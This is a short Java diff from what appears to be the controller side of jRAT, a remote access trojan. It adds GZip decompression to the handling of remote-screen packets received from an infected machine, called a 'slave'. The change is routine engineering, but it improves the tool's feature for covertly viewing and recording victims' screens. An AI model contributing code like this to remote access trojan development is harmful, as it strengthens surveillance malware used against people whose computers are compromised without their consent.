@@ -13,6 +13,7 @@ import pro.jrat.Main;
 import pro.jrat.RemoteScreenData;
 import pro.jrat.Slave;
 import pro.jrat.Traffic;
+import pro.jrat.api.compress.GZip;
 import pro.jrat.threads.ThreadImage;
 import pro.jrat.threads.ThreadRemoteScreenRecorder;
 import pro.jrat.ui.frames.FrameRemoteScreen;
@@ -78,6 +79,7 @@ public class Packet17RemoteScreen extends AbstractIncomingPacket {
 
 		byte[] buffer = new byte[blen];
 		slave.getDataInputStream().readFully(buffer);
+		buffer = GZip.decompress(buffer);
 		
 		if (frame != null) {
 			try {
